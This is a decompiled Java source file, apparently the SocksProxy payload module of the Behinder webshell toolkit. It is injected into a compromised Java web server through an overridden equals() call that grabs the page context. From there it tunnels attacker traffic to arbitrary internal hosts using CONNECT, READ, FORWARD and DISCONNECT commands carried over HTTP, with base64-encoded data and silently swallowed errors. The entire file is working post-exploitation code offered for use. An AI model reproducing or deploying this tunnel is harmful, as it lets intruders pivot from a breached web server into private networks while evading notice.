package net.rebeyond.behinder.payload.java;

import java.lang.reflect.Method;
import java.net.InetSocketAddress;
import java.nio.ByteBuffer;
import java.nio.channels.SocketChannel;
import java.util.Enumeration;
import java.util.Map;

public class SocksProxy {
   public static String cmd;
   public static String targetIP;
   public static String targetPort;
   public static String socketHash;
   public static String extraData;
   private Object Request;
   private Object Response;
   private Object Session;

   public boolean equals(Object obj) {
      try {
         this.fillContext(obj);
         this.proxy();
      } catch (Exception var3) {
      }

      return true;
   }

   public void proxy() throws Exception {
      Object request = this.Request;
      Object response = this.Response;
      Object session = this.Session;
      if (cmd != null) {
         if (cmd.compareTo("CONNECT") == 0) {
            try {
               String target = targetIP;
               int port = Integer.parseInt(targetPort);
               SocketChannel socketChannel = SocketChannel.open();
               socketChannel.connect(new InetSocketAddress(target, port));
               socketChannel.configureBlocking(false);
               this.sessionSetAttribute(session, "socket_" + socketHash, socketChannel);
               response.getClass().getMethod("setStatus", Integer.TYPE).invoke(response, 200);
            } catch (Exception var10) {
               Object so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
               Method write = so.getClass().getMethod("write", byte[].class);
               write.invoke(so, new byte[]{55, 33, 73, 54});
               write.invoke(so, var10.getMessage().getBytes());
               so.getClass().getMethod("flush").invoke(so);
               so.getClass().getMethod("close").invoke(so);
            }
         } else {
            SocketChannel socketChannel;
            if (cmd.compareTo("DISCONNECT") == 0) {
               try {
                  socketChannel = (SocketChannel)this.sessionGetAttribute(session, "socket_" + socketHash);
                  socketChannel.socket().close();
               } catch (Exception var9) {
               }

               this.sessionRemoveAttribute(session, "socket_" + socketHash);
            } else {
               Method write;
               Object so;
               if (cmd.compareTo("READ") == 0) {
                  socketChannel = (SocketChannel)this.sessionGetAttribute(session, "socket_" + socketHash);

                  try {
                     ByteBuffer buf = ByteBuffer.allocate(512);
                     int bytesRead = socketChannel.read(buf);
                     so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);

                     for(write = so.getClass().getMethod("write", byte[].class, Integer.TYPE, Integer.TYPE); bytesRead > 0; bytesRead = socketChannel.read(buf)) {
                        write.invoke(so, buf.array(), 0, bytesRead);
                        so.getClass().getMethod("flush").invoke(so);
                        buf.clear();
                     }

                     so.getClass().getMethod("flush").invoke(so);
                     so.getClass().getMethod("close").invoke(so);
                  } catch (Exception var12) {
                     response.getClass().getMethod("setStatus", Integer.TYPE).invoke(response, 200);
                     so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
                     write = so.getClass().getMethod("write", byte[].class);
                     write.invoke(so, new byte[]{55, 33, 73, 54});
                     write.invoke(so, var12.getMessage().getBytes());
                     so.getClass().getMethod("flush").invoke(so);
                     so.getClass().getMethod("close").invoke(so);
                     socketChannel.socket().close();
                  } catch (Error var13) {
                  }
               } else if (cmd.compareTo("FORWARD") == 0) {
                  socketChannel = (SocketChannel)this.sessionGetAttribute(session, "socket_" + socketHash);

                  try {
                     byte[] extraDataByte = this.base64decode(extraData);
                     ByteBuffer buf = ByteBuffer.allocate(extraDataByte.length);
                     buf.clear();
                     buf.put(extraDataByte);
                     buf.flip();

                     while(buf.hasRemaining()) {
                        socketChannel.write(buf);
                     }
                  } catch (Exception var11) {
                     so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
                     write = so.getClass().getMethod("write", byte[].class);
                     write.invoke(so, new byte[]{55, 33, 73, 54});
                     write.invoke(so, var11.getMessage().getBytes());
                     so.getClass().getMethod("flush").invoke(so);
                     so.getClass().getMethod("close").invoke(so);
                     socketChannel.socket().close();
                  }
               }
            }
         }
      }

   }

   private byte[] base64decode(String text) throws Exception {
      String version = System.getProperty("java.version");
      byte[] result = null;

      try {
         Class Base64;
         Object Decoder;
         if (version.compareTo("1.9") >= 0) {
            this.getClass();
            Base64 = Class.forName("java.util.Base64");
            Decoder = Base64.getMethod("getDecoder", (Class[])null).invoke(Base64, (Object[])null);
            result = (byte[])((byte[])Decoder.getClass().getMethod("decode", String.class).invoke(Decoder, text));
         } else {
            this.getClass();
            Base64 = Class.forName("sun.misc.BASE64Decoder");
            Decoder = Base64.newInstance();
            result = (byte[])((byte[])Decoder.getClass().getMethod("decodeBuffer", String.class).invoke(Decoder, text));
         }
      } catch (Exception var6) {
      }

      return result;
   }

   private void fillContext(Object obj) throws Exception {
      if (obj.getClass().getName().indexOf("PageContext") >= 0) {
         this.Request = obj.getClass().getMethod("getRequest").invoke(obj);
         this.Response = obj.getClass().getMethod("getResponse").invoke(obj);
         this.Session = obj.getClass().getMethod("getSession").invoke(obj);
      } else {
         Map objMap = (Map)obj;
         this.Session = objMap.get("session");
         this.Response = objMap.get("response");
         this.Request = objMap.get("request");
      }

      this.Response.getClass().getMethod("setCharacterEncoding", String.class).invoke(this.Response, "UTF-8");
   }

   private Object sessionGetAttribute(Object session, String key) {
      Object result = null;

      try {
         result = session.getClass().getMethod("getAttribute", String.class).invoke(session, key);
      } catch (Exception var5) {
      }

      return result;
   }

   private void sessionSetAttribute(Object session, String key, Object value) {
      try {
         session.getClass().getMethod("setAttribute", String.class, Object.class).invoke(session, key, value);
      } catch (Exception var5) {
      }

   }

   private Enumeration sessionGetAttributeNames(Object session) {
      Enumeration result = null;

      try {
         result = (Enumeration)session.getClass().getMethod("getAttributeNames").invoke(session);
      } catch (Exception var4) {
      }

      return result;
   }

   private void sessionRemoveAttribute(Object session, String key) {
      try {
         session.getClass().getMethod("removeAttribute").invoke(session, key);
      } catch (Exception var4) {
      }

   }
}
